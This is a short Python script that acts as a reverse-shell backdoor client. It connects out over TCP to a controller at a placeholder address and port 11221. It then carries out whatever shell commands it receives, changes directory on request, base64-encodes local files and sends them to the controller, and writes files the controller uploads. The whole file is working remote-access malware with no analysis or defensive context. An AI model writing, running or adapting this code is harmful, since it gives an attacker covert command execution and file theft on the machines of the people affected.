#!/usr/bin/python
import socket
import subprocess
import json
import os
import struct
import utils
import base64


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("0.0.0.0", 11221))
while True:
    result = ""
    cmd = utils.receive_frame(sock)
    print(cmd)
    if cmd == "q":
        continue
    elif cmd == "close":
        break    
    elif cmd[:7] == "sendall":
        proc = subprocess.Popen(cmd[8:], shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    elif cmd[:2] == "cd" and len(cmd.strip()) > 3:
        try:
            os.chdir(cmd[3:])
        except Exception as e:
            result = str(e)
    elif cmd[:8] == "download":
        try:
            with open(cmd[9:],"rb") as f:
                encoded_file = base64.b64encode(f.read())
                utils.reliable_send(sock, encoded_file.decode("utf-8"))
        except:
                utils.reliable_send(sock, "DOWNLOAD_FAIL")
    elif cmd[:6] == "upload":
            file_data = utils.receive_frame(sock)
            if file_data == "UPLOAD_FAIL":
                    result = "Failed to upload"
            else:
                with open(cmd[7:],"wb") as f:
                    f.write(base64.b64decode(file_data))
                    result = "File Uploaded!"

    else:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = (proc.stdout.read() + proc.stderr.read()).decode("utf-8")
    utils.reliable_send(sock, result)

sock.close()
